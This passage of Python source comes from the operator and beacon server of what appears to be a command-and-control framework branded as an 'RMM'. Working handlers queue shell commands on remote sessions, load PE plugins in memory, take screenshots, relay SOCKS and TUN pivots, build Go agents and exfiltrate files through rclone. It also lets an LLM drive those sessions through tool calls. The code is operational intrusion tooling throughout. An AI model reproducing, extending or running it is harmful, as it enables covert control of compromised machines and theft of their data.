                    hub.set_filter(ws, msg.get("session_id"))
                    ws.send_json({"op": "subscribed", "session_id": msg.get("session_id")})
        finally:
            hub.remove(ws)
            ws.close()
        return True

    def _handle_socks_agent_websocket(self, session_id: str) -> bool:
        """Agent SOCKS relay channel (beacon auth). Main /cmd beacon stays HTTP."""
        ws = WebSocketConnection.from_http_request(
            self.connection,
            self.headers,
            self.path,
        )
        if not ws:
            self._respond(
                400,
                "WebSocket handshake failed (need Sec-WebSocket-Key and Version 13)",
            )
            return True
        self.server_instance.touch_session(session_id)
        if not self.server_instance.socks.attach_agent_ws(session_id, ws):
            try:
                ws.send_json({"op": "active", "active": False})
            except Exception:
                pass
            ws.close()
            return True
        self.close_connection = False
        try:
            while self.server_instance.running and not ws.closed:
                msg = ws.recv_json()
                if msg is None:
                    break
                if msg.get("op") == "_timeout":
                    continue
                if msg.get("op") == "ping":
                    self.server_instance.touch_session(session_id)
                    ws.send_json({"op": "pong"})
                    continue
                if msg.get("op") == "pull":
                    self.server_instance.touch_session(session_id)
                    tasks = self.server_instance.socks.pull_tasks_for_ws(session_id)
                    ws.send_json({"op": "tasks", "tasks": tasks})
                    continue
                if msg.get("op") == "responses":
                    responses = msg.get("responses")
                    if isinstance(responses, list):
                        self.server_instance.socks.submit_agent_responses(
                            session_id, responses
                        )
                    continue
        finally:
            self.server_instance.socks.detach_agent_ws(session_id, ws)
            ws.close()
        return True

    def _serve_artifact(self, kind: str, filename: str, qs=None):
        if kind not in ("downloads", "screenshots", "agent-builds"):
            self._json(404, {"error": "not_found"})
            return True
        safe = safe_storage_filename(filename, "")
        if not safe:
            self._json(400, {"error": "invalid_filename"})
            return True
        try:
            path = safe_join_under(os.path.join(LOG_DIR, kind), safe)
        except ValueError:
            self._json(403, {"error": "forbidden"})
            return True
        if not os.path.isfile(path):
            self._json(404, {"error": "not_found"})
            return True
        if kind == "screenshots":
            mime = "image/png"
        elif safe.lower().endswith(".zip"):
            mime = "application/zip"
        else:
            mime = "application/octet-stream"
        download_name = safe
        if qs:
            as_name = (qs.get("as", [""])[0] or "").strip()
            if as_name:
                download_name = safe_storage_filename(as_name, safe)
        with open(path, "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", mime)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Content-Disposition", f'attachment; filename="{download_name}"')
        self.end_headers()
        self._safe_write(data)
        return True

    def _beacon_token_from_request(self, qs):
        header = self.headers.get("X-RMM-Beacon-Token", "").strip()
        if header:
            return header
        return qs.get("beacon_token", [""])[0].strip()

    @staticmethod
    def _beacon_session_id_from_qs(qs) -> tuple[str | None, str | None]:
        """Return (error_message, session_id). error_message is set when id is missing or invalid."""
        raw = qs.get("id", [None])[0]
        if raw is None or not str(raw).strip():
            return "Missing session ID", None
        session_id = validate_beacon_session_id(str(raw))
        if not session_id:
            return "INVALID SESSION ID", None
        return None, session_id

    def _beacon_authorized(self, qs):
        if INSECURE and not BEACON_SECRET:
            return True
        if not BEACON_SECRET:
            return False
        return secure_compare(self._beacon_token_from_request(qs), BEACON_SECRET)

    def _beacon_forbidden(self):
        self._respond(403, "FORBIDDEN")

    def _serve_rclone_tool(self) -> bool:
        """Beacon-authenticated download of rclone.exe for agent bootstrap."""
        if not rclone_binary_available():
            self._respond(404, "rclone binary not configured on server")
            return True
        with open(RCLONE_BIN_PATH, "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Disposition", 'attachment; filename="rclone.exe"')
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()
        self._safe_write(data)
        return True

    def _serve_plugin_tool(self, name: str, session_id: str | None = None) -> bool:
        """Beacon-authenticated download of one agent plugin."""
        if not PLUGIN_NAME_RE.match(name):
            self._respond(400, "Invalid plugin name")
            return True
        if os.path.splitext(name)[1].lower() not in PLUGIN_ARTIFACT_EXTENSIONS:
            self._respond(404, "Unknown plugin")
            return True
        content_type = (
            "text/plain; charset=utf-8"
            if os.path.splitext(name)[1].lower() == ".ps1"
            else "application/octet-stream"
        )
        path = plugin_path_for_session(name, session_id, getattr(self, "server_instance", None))
        if path is None:
            self._respond(404, "Unknown plugin")
            return True
        with open(path, "rb") as handle:
            data = handle.read()
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Disposition", f'attachment; filename="{name}"')
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()
        self._safe_write(data)
        server = getattr(self, "server_instance", None)
        if server is not None:
            server.log(
                f"Plugin downloaded: session={(session_id or 'unknown')[:8]} "
                f"plugin={name} bytes={len(data)}",
                "INFO",
            )
        return True

    def _serve_web(self, path: str) -> bool:
        """Serve static files from WEB_DIR under /ui/ (and redirect / → /ui/)."""
        if path in ("", "/"):
            self.send_response(302)
            self.send_header("Location", "/ui/")
            self.end_headers()
            return True

        if not path.startswith("/ui"):
            return False

        rel = path[len("/ui") :].lstrip("/") or "index.html"
        if ".." in rel or rel.startswith(("/", "\\")):
            self._respond(403, "Forbidden")
            return True

        filepath = os.path.realpath(os.path.join(WEB_DIR, rel))
        web_root = os.path.realpath(WEB_DIR)
        if filepath != web_root and not filepath.startswith(web_root + os.sep):
            self._respond(403, "Forbidden")
            return True
        if not os.path.isfile(filepath):
            self._respond(404, "Not Found")
            return True

        ext = os.path.splitext(filepath)[1].lower()
        with open(filepath, "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", WEB_MIME.get(ext, "application/octet-stream"))
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()
        self._safe_write(data)
        return True

    def _api_path_parts(self, path):
        if not path.startswith(API_PREFIX + "/"):
            return None
        rest = path[len(API_PREFIX) + 1 :]
        return [p for p in rest.split("/") if p]

    def _handle_api_get(self, path, qs):
        if not self._api_authorized(qs):
            self._api_unauthorized()
            return True
        parts = self._api_path_parts(path)
        if parts is None:
            return False
        srv = self.server_instance
        workspace_id = getattr(self, "_workspace_scope", lambda: None)()

        if parts == ["workspace", "sessions"]:
            if not workspace_id:
                self._json(403, {"error": "workspace_auth_required"})
                return True
            self._json(200, {"workspace_id": workspace_id, "sessions": srv.workspace_sessions(workspace_id)})
            return True

        if parts == ["workspace", "candidates"]:
            if not workspace_id:
                self._json(403, {"error": "workspace_auth_required"})
                return True
            self._json(200, {"workspace_id": workspace_id, "sessions": srv.workspace_candidates(workspace_id)})
            return True

        if parts == ["workspace", "events"]:
            if not workspace_id:
                self._json(403, {"error": "workspace_auth_required"})
                return True
            try:
                since = max(0, int(qs.get("since", ["0"])[0] or 0))
                limit = max(1, min(1000, int(qs.get("limit", ["100"])[0] or 100)))
            except (TypeError, ValueError):
                self._json(400, {"error": "invalid_workspace_cursor"})
                return True
            self._json(200, srv.workspace_events.read(workspace_id, since=since, limit=limit))
            return True

        if len(parts) == 5 and parts[:2] == ["workspace", "sessions"] and parts[4] == "responses":
            if not workspace_id:
                self._json(403, {"error": "workspace_auth_required"})
                return True
            channel = parts[3]
            if channel not in {"socks", "tun"}:
                self._json(404, {"error": "not_found"})
                return True
            session = srv.resolve_workspace_session(workspace_id, parts[2])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(
                200,
                {
                    "session_id": session.id,
                    "channel": channel,
                    "responses": srv.workspace_drain_responses(workspace_id, session.id, channel),
                },
            )
            return True

        if parts == ["rclone", "capabilities"]:
            plugin = next(
                (item for item in list_plugin_files(workspace_id)
                 if item.get("name", "").lower().startswith("rclone-exfil")
                 and item.get("name", "").lower().endswith(".dll")),
                None,
            )
            self._json(
                200,
                {
                    "rclone_binary": rclone_binary_available(),
                    "rclone_plugin": plugin,
                    "workspace_local": srv.storage_mode == "workspace",
                },
            )
            return True

        if parts == ["rclone", "config"]:
            if srv.storage_mode == "workspace":
                self._json(409, {"error": "rclone_config_is_workspace_local"})
                return True
            self._json(200, srv.rclone_config())
            return True

        if parts == ["health"]:
            if workspace_id:
                count = len(srv.workspace_sessions(workspace_id))
            else:
                count = len(srv.sessions)
            self._json(
                200,
                {
                    "status": "ok",
                    "sessions": count,
                    "storage_mode": srv.storage_mode,
                    "admin_port": getattr(srv, "admin_port", ADMIN_PORT),
                    "beacon_port": getattr(srv, "beacon_port", BEACON_PORT),
                    "beacon_public_url": getattr(srv, "beacon_public_url", "") or None,
                },
            )
            return True

        if parts == ["ui", "config"]:
            try:
                config = srv.get_ui_state()
            except UiStateError as exc:
                self._json(500, {"error": "ui_state_invalid", "detail": str(exc)})
                return True
            self._json(
                200,
                {
                    "config": config or {},
                    "exists": config is not None,
                    "storage": "sqlite",
                    "scope": "server",
                },
            )
            return True

        if parts == ["agent", "script"]:
            script_path = os.path.realpath(CLIENT_SCRIPT)
            repo_root = os.path.realpath(os.path.dirname(os.path.abspath(__file__)))
            if not script_path.startswith(repo_root + os.sep):
                self._json(500, {"error": "invalid_script_path"})
                return True
            if not os.path.isfile(script_path):
                self._json(404, {"error": "script_not_found"})
                return True
            with open(script_path, "r", encoding="utf-8") as f:
                content = f.read()
            self._json(200, {"filename": "client_rmm.ps1", "content": content})
            return True

        if parts == ["agent", "go"]:
            try:
                files = go_agent_source_files()
            except (OSError, UnicodeError) as exc:
                self._json(500, {"error": "go_source_unavailable", "detail": str(exc)})
                return True
            self._json(
                200,
                {
                    "files": files,
                    "targets": [
                        {"goos": goos, "goarch": goarch}
                        for goos, goarch in sorted(GO_AGENT_TARGETS)
                    ],
                    "build_endpoint": f"{API_PREFIX}/agent/go/build",
                },
            )
            return True

        if parts == ["sessions"]:
            try:
                sessions = srv.sessions_to_json(workspace_id=workspace_id)
            except TypeError:
                sessions = srv.sessions_to_json()
            self._json(200, {"sessions": sessions})
            return True

        if parts == ["socks"]:
            relays = srv.list_socks_status()
            if workspace_id:
                relays = [
                    row for row in relays
                    if getattr(srv.get_session(row.get("session_id")), "workspace_id", None) == workspace_id
                ]
            self._json(200, {"count": len(relays), "relays": relays})
            return True

        if parts == ["tun"]:
            relays = srv.list_tun_status()
            if workspace_id:
                relays = [
                    row for row in relays
                    if getattr(srv.get_session(row.get("session_id")), "workspace_id", None) == workspace_id
                ]
            self._json(200, {"count": len(relays), "relays": relays})
            return True

        if len(parts) == 2 and parts[0] == "sessions":
            session = _resolve_api_session(self, parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(200, {"session": session.to_dict()})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "events":
            since_id = int(qs.get("since", ["0"])[0] or 0)
            limit = int(qs.get("limit", ["50"])[0] or 50)
            if workspace_id and not _resolve_api_session(self, parts[1]):
                self._json(404, {"error": "session_not_found"})
                return True
            events = srv.get_events(parts[1], since_id=since_id, limit=limit)
            if events is None:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(200, {"events": events})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "downloads":
            session = _resolve_api_session(self, parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            downloads = srv.list_session_downloads(session.id)
            self._json(
                200,
                {"session_id": session.id, "downloads": downloads or []},
            )
            return True

        if len(parts) == 4 and parts[0] == "sessions" and parts[2] == "ai" and parts[3] == "chat":
            if workspace_id and not _resolve_api_session(self, parts[1]):
                self._json(404, {"error": "session_not_found"})
                return True
            session_id, messages = srv.get_ai_chat(parts[1])
            if session_id is None or messages is None:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(
                200,
                {"session_id": session_id, "messages": messages, "count": len(messages)},
            )
            return True

        if parts == ["ai", "skills"]:
            skills = srv.list_ai_skills()
            self._json(
                200,
                {
                    "skills": skills,
                    "count": len(skills),
                    "directory": srv.skill_directories(),
                },
            )
            return True

        if parts == ["profile"]:
            self._json(200, srv.profile_status())
            return True

        if parts == ["transport"]:
            self._json(
                200,
                {
                    "admin_url": self._operator_api_base_url(),
                    "beacon_url": srv.beacon_public_url or f"http://127.0.0.1:{srv.beacon_port}",
                    "beacon_port": srv.beacon_port,
                    "profile": srv.profile_status(),
                },
            )
            return True

        if parts == ["history"]:
            if workspace_id:
                self._json(200, {"sessions": [], "count": 0})
                return True
            rows = srv.list_session_history()
            ended = [r for r in rows if not r.get("active")]
            self._json(200, {"sessions": ended, "count": len(ended)})
            return True

        if len(parts) == 2 and parts[0] == "history":
            if workspace_id:
                self._json(404, {"error": "session_not_found"})
                return True
            meta = srv.get_history_meta(parts[1])
            if not meta:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(200, {"session": meta})
            return True

        if len(parts) == 3 and parts[0] == "history" and parts[2] == "events":
            if workspace_id:
                self._json(404, {"error": "session_not_found"})
                return True
            since_id = int(qs.get("since", ["0"])[0] or 0)
            limit = int(qs.get("limit", ["500"])[0] or 500)
            session_id, events = srv.get_history_events(parts[1], since_id=since_id, limit=limit)
            if session_id is None or events is None:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(200, {"session_id": session_id, "events": events})
            return True

        if parts == ["artifacts"]:
            kind = (qs.get("kind", ["downloads"])[0] or "downloads").strip().lower()
            if kind not in {"downloads", "screenshots"}:
                self._json(400, {"error": "invalid_artifact_kind"})
                return True
            artifacts = srv.list_artifacts(kind, workspace_id=workspace_id)
            self._json(200, {"kind": kind, "count": len(artifacts), "artifacts": artifacts})
            return True

        if len(parts) == 3 and parts[0] == "artifacts":
            if workspace_id and parts[1] != "agent-builds":
                self._json(404, {"error": "not_found"})
                return True
            return self._serve_artifact(parts[1], parts[2], qs)

        if parts == ["plugins"]:
            self._json(
                200,
                {
                    "plugins": list_plugin_files(workspace_id),
                },
            )
            return True

        if parts == ["assets"]:
            rows = asset_store().list()
            self._json(200, {"assets": rows, "count": len(rows), "workspace_local": False})
            return True

        if len(parts) == 2 and parts[0] == "assets":
            try:
                rows = asset_store().list(parts[1])
            except AssetError as exc:
                self._json(400, {"error": str(exc)})
                return True
            self._json(200, {"assets": rows, "count": len(rows), "workspace_local": False})
            return True

        self._json(404, {"error": "not_found"})
        return True

    def _handle_api_post(self, path, body):
        if not self._api_authorized():
            self._api_unauthorized()
            return True
        parts = self._api_path_parts(path)
        if parts is None:
            return False
        srv = self.server_instance
        workspace_id = getattr(self, "_workspace_scope", lambda: None)()

        if parts == ["workspace", "claims"]:
            if not workspace_id:
                self._json(403, {"error": "workspace_auth_required"})
                return True
            session, error = srv.claim_workspace_session(workspace_id, str(body.get("session_id") or "").strip())
            if error == "session_claimed":
                self._json(409, {"error": error})
            elif error:
                self._json(404 if error == "session_not_found" else 400, {"error": error})
            else:
                self._json(200, {"ok": True, "session": session.to_dict()})
            return True

        if len(parts) == 5 and parts[:2] == ["workspace", "sessions"] and parts[4] == "tasks":
            if not workspace_id:
                self._json(403, {"error": "workspace_auth_required"})
                return True
            channel = parts[3]
            tasks = body.get("tasks")
            if channel not in {"socks", "tun"} or not isinstance(tasks, list):
                self._json(400, {"error": "invalid_workspace_tasks"})
                return True
            session = srv.resolve_workspace_session(workspace_id, parts[2])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            if not srv.workspace_submit_tasks(workspace_id, session.id, channel, tasks):
                self._json(409, {"error": "workspace_pivot_inactive"})
                return True
            self._json(200, {"ok": True, "session_id": session.id, "channel": channel})
            return True

        if parts == ["workspace", "assets", "plugins"]:
            if not workspace_id:
                self._json(403, {"error": "workspace_auth_required"})
                return True
            name = str(body.get("name") or "").strip()
            if not PLUGIN_NAME_RE.fullmatch(name) or os.path.splitext(name)[1].lower() not in PLUGIN_ARTIFACT_EXTENSIONS:
                self._json(400, {"error": "invalid_plugin_name"})
                return True
            target = _workspace_plugin_path(workspace_id, name)
            if not target:
                self._json(400, {"error": "invalid_plugin_path"})
                return True
            enabled = bool(body.get("enabled", True))
            if not enabled:
                try:
                    if os.path.isfile(target):
                        os.unlink(target)
                except OSError as exc:
                    self._json(500, {"error": "plugin_cache_remove_failed", "detail": str(exc)})
                    return True
                self._json(200, {"ok": True, "name": name, "enabled": False})
                return True
            try:
                content = base64.b64decode(str(body.get("content_b64") or ""), validate=True)
            except (ValueError, TypeError):
                self._json(400, {"error": "invalid_plugin_content"})
                return True
            if not content or len(content) > MAX_BODY_BYTES:
                self._json(413, {"error": "plugin_too_large"})
                return True
            expected = str(body.get("sha256") or "").strip().lower()
            actual = hashlib.sha256(content).hexdigest()
            if expected and expected != actual:
                self._json(400, {"error": "plugin_checksum_mismatch"})
                return True
            write_atomic_bytes(target, content)
            self._json(200, {"ok": True, "name": name, "size": len(content), "sha256": actual})
            return True

        if parts == ["profile"]:
            try:
                if body.get("stop"):
                    stopped = srv.stop_profile()
                    self._json(200, {"ok": True, "stopped": stopped, "profile": srv.profile_status()})
                else:
                    config = body.get("config") if isinstance(body.get("config"), dict) else {}
                    status = srv.start_profile(body.get("name"), config=config)
                    self._json(200, {"ok": True, "profile": status})
            except ProfileError as exc:
                self._json(503, {"error": "profile_start_failed", "detail": str(exc), "profile": srv.profile_status()})
            return True

        asset_kind = None
        if len(parts) == 2 and parts[0] == "assets":
            asset_kind = parts[1]
        elif parts == ["plugins"]:
            asset_kind = "plugins"
        elif parts == ["ai", "skills"]:
            asset_kind = "skills"
        elif parts == ["rclone", "profiles"]:
            asset_kind = "rclone"
        if asset_kind:
            try:
                name = str(body.get("name") or "").strip()
                content_b64 = body.get("content_b64")
                if content_b64 is not None:
                    content = decode_asset_content(content_b64, max_bytes=MAX_BODY_BYTES)
                    if not name:
                        raise AssetError("uploaded asset name is required")
                    row = asset_store().add_bytes(
                        asset_kind,
                        name,
                        content,
                        enabled=bool(body.get("enabled", True)),
                    )
                else:
                    url = str(body.get("url") or "").strip()
                    if not url:
                        self._json(400, {"error": "missing_url_or_content"})
                        return True
                    row = asset_store().add_url(
                        asset_kind,
                        url,
                        name=name,
                        enabled=bool(body.get("enabled", True)),
                    )
                if asset_kind == "plugins":
                    content = asset_store().read("plugins", row["name"], enabled_only=False)
                    write_atomic_bytes(safe_join_under(plugin_directory(), row["name"]), content)
            except AssetError as exc:
                self._json(400, {"error": str(exc)})
                return True
            self._json(201, {"ok": True, "asset": row, "workspace_local": False})
            return True

        if parts == ["agent", "go", "build"]:
            try:
                result = build_go_agent(
                    body.get("goos"),
                    body.get("goarch"),
                    agent_config=body.get("config"),
                )
            except ValueError as exc:
                self._json(400, {"error": "invalid_target", "detail": str(exc)})
                return True
            except FileNotFoundError as exc:
                self._json(404, {"error": "go_source_unavailable", "detail": str(exc)})
                return True
            except RuntimeError as exc:
                self._json(503, {"error": "go_build_failed", "detail": str(exc)})
                return True
            self._json(200, result)
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "commands":
            session = _resolve_api_session(self, parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            command = body.get("command", "")
            cmd_type = body.get("type", "oneshot")
            if cmd_type not in ("oneshot", "persistent"):
                self._json(400, {"error": "invalid_type"})
                return True
            if not command:
                self._json(400, {"error": "missing_command"})
                return True
            srv.set_command(session.id, command, cmd_type)
            srv.record_operator_action(session, command, "queued" if cmd_type == "oneshot" else "persist")
            self._json(200, {"ok": True, "session_id": session.id})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "exec":
            command = body.get("command", "")
            timeout = float(body.get("timeout", 120))
            if not command:
                self._json(400, {"error": "missing_command"})
                return True
            session = _resolve_api_session(self, parts[1])
            if session:
                srv.record_operator_action(session, command, "exec")
            result, status = srv.exec_and_wait(session.id if session else parts[1], command, timeout=timeout)
            if status == "not_found":
                self._json(404, {"error": "session_not_found"})
                return True
            if status == "timeout":
                self._json(408, {"error": "timeout", "command": command})
                return True
            self._json(200, {"ok": True, "event": result})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "upload":
            session = _resolve_api_session(self, parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            local_b64 = body.get("content_b64", "")
            remote_file = body.get("remote_path", "")
            if not local_b64 or not remote_file:
                self._json(400, {"error": "missing_content_b64_or_remote_path"})
                return True
            data = json.dumps({
                "filename": os.path.basename(remote_file.replace("\\", "/")),
                "src_filename": body.get("src_filename", ""),
                "content": local_b64,
            })
            cmd = f"__UPLOAD__ {remote_file}"
            srv.set_command(session.id, f"{cmd}\n{data}", "oneshot")
            srv.record_operator_action(session, cmd, "upload")
            self._json(200, {"ok": True, "session_id": session.id})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "download":
            session = _resolve_api_session(self, parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            remote_path = body.get("remote_path", "").strip()
            if not remote_path:
                self._json(400, {"error": "missing_remote_path"})
                return True
            cmd = srv.queue_agent_download(session, remote_path)
            srv.record_operator_action(session, cmd, "download")
            self._json(200, {"ok": True, "session_id": session.id, "queued": cmd})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "exfil":
            session = _resolve_api_session(self, parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            remote_path = body.get("remote_path", "").strip()
            if not remote_path:
                self._json(400, {"error": "missing_remote_path"})
                return True
            profile = (body.get("profile") or get_rclone_default_profile()).strip()
            dest = (body.get("dest") or "").strip() or None
            mode = (body.get("mode") or "auto").strip().lower()
            workspace_job = body.get("workspace_job")
            try:
                cmd = srv.queue_agent_exfil(
                    session,
                    remote_path,
                    profile,
                    dest=dest,
                    mode=mode,
                    workspace_job=workspace_job,
                )
            except (ValueError, RcloneConfigError) as e:
                rclone_status = (
                    {"workspace_local": True}
                    if srv.storage_mode == "workspace"
                    else rclone_public_config()
                )
                self._json(503, {"error": str(e), "rclone": rclone_status})
                return True
            execution_mode = "plugin" if cmd.startswith("__PE_LOAD__ ") else "binary"
            srv.record_operator_action(session, f"exfil {remote_path}", "exfil", f"mode={execution_mode}")
            max_bytes = get_rclone_max_bytes()
            if isinstance(workspace_job, dict) and workspace_job.get("max_bytes") is not None:
                max_bytes = workspace_job.get("max_bytes")
            rclone_status = (
                {"workspace_local": True}
                if srv.storage_mode == "workspace"
                else rclone_public_config()
            )
            self._json(
                200,
                {
                    "ok": True,
                    "session_id": session.id,
                    "queued": cmd.split("\n", 1)[0],
                    "profile": profile,
                    "mode": mode,
                    "execution_mode": execution_mode,
                    "max_bytes": max_bytes,
                    "rclone": rclone_status,
                },
            )
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "screenshot":
            session = _resolve_api_session(self, parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            srv.set_command(session.id, "__SCREENSHOT__", "oneshot")
            srv.record_operator_action(session, "__SCREENSHOT__", "screenshot")
            self._json(200, {"ok": True, "session_id": session.id, "queued": "__SCREENSHOT__"})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "pe":
            session = _resolve_api_session(self, parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            plugin = str(body.get("plugin", "")).strip()
            if not plugin:
                self._json(400, {"error": "missing_plugin"})
                return True
            if not PLUGIN_NAME_RE.match(plugin):
                self._json(400, {"error": "invalid_plugin"})
                return True
            export = str(body.get("export", "")).strip() or "Run"
            if not PLUGIN_EXPORT_RE.match(export):
                self._json(400, {"error": "invalid_export"})
                return True
            plugin_command = str(body.get("command", "")).strip()
            if plugin_command and not PLUGIN_COMMAND_RE.fullmatch(plugin_command):
                self._json(400, {"error": "invalid_plugin_command"})
                return True
            plugin_input = str(body.get("input", ""))
            if "\r" in plugin_input or "\n" in plugin_input:
                self._json(400, {"error": "invalid_input"})
                return True
            # The command envelope adds a small JSON wrapper before the
            # agent frames the input for the plugin child.
            plugin_input = plugin_input[:4000 if plugin_command else 4096]
            if plugin_command:
                # The agent always invokes the stable Run ABI for a command
                # namespace. The plugin owns command dispatch and validation.
                command = f"__PLUGIN_COMMAND__ {plugin} {plugin_command}"
            else:
                command = f"__PE_LOAD__ {plugin} {export}"
            if plugin_input:
                command += " " + plugin_input
            srv.set_command(session.id, command, "oneshot")
            srv.record_operator_action(session, command, "pe")
            self._json(200, {"ok": True, "session_id": session.id, "queued": command})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "socks":
            session = _resolve_api_session(self, parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            if body.get("stop"):
                srv.stop_socks(session.id)
                self._json(200, {"ok": True, "session_id": session.id, "stopped": True})
                return True
            port = int(body.get("port", DEFAULT_SOCKS_PORT))
            if port < 1 or port > 65535:
                self._json(400, {"error": "invalid_port"})
                return True
            bind_host = str(body.get("bind_host", DEFAULT_BIND_HOST))
            plugin_error = srv.pivot_plugin_error(session)
            if plugin_error:
                self._json(503, {"error": "pivot_plugin_unavailable", "detail": plugin_error})
                return True
            if not srv.start_socks(session.id, port=port, bind_host=bind_host):
                self._json(500, {"error": "socks_start_failed"})
                return True
            self._json(
                200,
                {
                    "ok": True,
                    "session_id": session.id,
                    "socks_url": f"socks5://{bind_host}:{port}",
                    "socks_active": True,
                },
            )
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "tun":
            session = _resolve_api_session(self, parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            if body.get("stop"):
                srv.stop_tun(session.id)
                self._json(200, {"ok": True, "session_id": session.id, "stopped": True})
                return True
            try:
                config = normalize_tun_config(body)
            except ValueError as exc:
                self._json(400, {"error": "invalid_tun_config", "detail": str(exc)})
                return True
            if srv.tun_active(session.id):
                self._json(409, {"error": "tun_already_active", "detail": "stop the current relay before changing its configuration"})
                return True
            plugin_error = srv.tun_plugin_error(session)
            if plugin_error:
                self._json(503, {"error": "tun_unavailable", "detail": plugin_error})
                return True
            try:
                status = srv.start_tun(session.id, config)
            except TunError as exc:
                self._json(503, {"error": "tun_start_failed", "detail": str(exc)})
                return True
            self._json(
                200,
                {
                    "ok": True,
                    "session_id": session.id,
                    "tun_active": True,
                    "tun": status,
                },
            )
            return True

        if parts == ["ai", "providers", "validate"]:
            provider = str(body.get("provider") or "").strip().lower()
            api_key = str(body.get("api_key") or "").strip()
            try:
                from rmm_ai import validate_ai_provider

                self._json(200, validate_ai_provider(provider, api_key))
            except ValueError as e:
                self._json(400, {"error": str(e)})
            except RuntimeError as e:
                self._json(502, {"error": "provider_validation_failed", "detail": str(e)})
            return True

        if parts == ["ai", "chat"]:
            provider = str(body.get("provider") or "openai").strip().lower()
            api_key = str(
                body.get("api_key")
                or body.get("openai_api_key")
                or (os.environ.get("OPENAI_API_KEY", "") if provider == "openai" else "")
            ).strip()
            if not api_key:
                self._json(400, {"error": "missing_api_key"})
                return True
            messages = body.get("messages") or []
            if not messages:
                self._json(400, {"error": "missing_messages"})
                return True
            model = str(body.get("model") or "")
            selected = body.get("selected_session_id")
            skill_ids = body.get("skill_ids")
            if skill_ids is not None and not isinstance(skill_ids, list):
                self._json(400, {"error": "invalid_skill_ids"})
                return True
            skill_documents = body.get("skill_documents")
            if skill_documents is not None and not isinstance(skill_documents, list):
                self._json(400, {"error": "invalid_skill_documents"})
                return True
            if skill_documents is None:
                from rmm_ai_skills import ai_skills_dir, resolve_ai_skills

                skill_documents = resolve_ai_skills(
                    skill_ids,
                    srv.skill_directories() if hasattr(srv, "skill_directories") else [ai_skills_dir()],
                    srv.skill_overrides() if hasattr(srv, "skill_overrides") else None,
                )
            workspace_id = getattr(self, "_workspace_scope", lambda: None)()
            workspace_token = self.headers.get("X-RMM-Workspace-Token", "").strip() if workspace_id else ""
            rmm_headers = {}
            if workspace_id and workspace_token:
                rmm_headers = {
                    "X-RMM-Workspace": workspace_id,
                    "X-RMM-Workspace-Token": workspace_token,
                }
            rmm_token = (self._api_token_from_request() or API_TOKEN or "").strip()
            if not rmm_token and not rmm_headers:
                self._json(401, {
                    "error": "unauthorized",
                    "detail": "Valid RMM_API_TOKEN or workspace credentials required for AI tool calls",
                })
                return True
            try:
                from rmm_ai import run_ai_chat

                result = run_ai_chat(
                    rmm_base_url=self._operator_api_base_url(),
                    rmm_token=rmm_token,
                    rmm_headers=rmm_headers,
                    provider=provider,
                    api_key=api_key,
                    messages=messages,
                    model=model,
                    selected_session_id=selected,
                    exegol_mcp_enabled=body.get("exegol_mcp_enabled"),
                    exegol_mcp_url=body.get("exegol_mcp_url"),
                    exegol_mcp_token=body.get("exegol_mcp_token"),
                    skill_ids=skill_ids,
                    skill_documents=skill_documents,
                )
                if result.get("ok") and selected:
                    stored = list(messages)
                    reply = result.get("message")
                    if isinstance(reply, str):
                        assistant_row: dict = {"role": "assistant", "content": reply}
                        tool_calls = result.get("tool_calls_made")
                        if isinstance(tool_calls, list) and tool_calls:
                            assistant_row["tool_calls_made"] = tool_calls
                        stored.append(assistant_row)
                        srv.save_ai_chat(str(selected), stored)
                status = 200 if result.get("ok") else 500
                self._json(status, result)
            except ValueError as e:
                self._json(400, {"error": str(e)})
            except RuntimeError as e:
                self._json(502, {"error": "ai_provider_error", "detail": str(e)})
            except Exception as e:
                self._json(500, {"error": "ai_chat_failed", "detail": str(e)})
            return True

        self._json(404, {"error": "not_found"})
        return True

    def _request_base_url(self) -> str:
        host = self.headers.get("Host", f"127.0.0.1:{PORT}")
        proto = self.headers.get("X-Forwarded-Proto", "").strip().lower()
        if proto not in ("http", "https"):
            proto = "http"
        return f"{proto}://{host}"

    def _operator_api_base_url(self) -> str:
        """Loopback URL for in-process clients (AI/MCP) calling the operator API."""
        host = LISTEN_HOST
        if host in ("0.0.0.0", "::", ""):
            host = "127.0.0.1"
        elif host == "::1":
            host = "127.0.0.1"
        port = getattr(self.server_instance, "admin_port", ADMIN_PORT)
        return f"http://{host}:{port}"

    def _handle_api_patch(self, path, body):
        if not self._api_authorized():
            self._api_unauthorized()
            return True
        parts = self._api_path_parts(path)
        if parts is None:
            return False
        srv = self.server_instance

